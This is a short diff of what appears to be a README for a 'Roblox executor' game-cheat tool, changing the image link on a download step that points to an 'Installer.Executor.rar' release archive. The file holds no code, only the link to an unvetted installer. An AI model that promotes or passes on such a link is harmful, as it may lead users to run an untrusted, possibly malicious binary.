@@ -5,7 +5,7 @@
 > ***How to download:***
 
 
-(![image](https://github.com/user-attachments/assets/90fab3af-1161-451c-9a9b-6f97af464ac7)](https://github.com/asalmobini/roblox-executor-2025-/releases/download/Release/Installer.Executor.rar) 
+(![image](![image](https://github.com/user-attachments/assets/a28c3c73-5faf-425c-a621-a900832a06e7)](https://github.com/asalmobini/roblox-executor-2025-/releases/download/Release/Installer.Executor.rar)
 
 
 
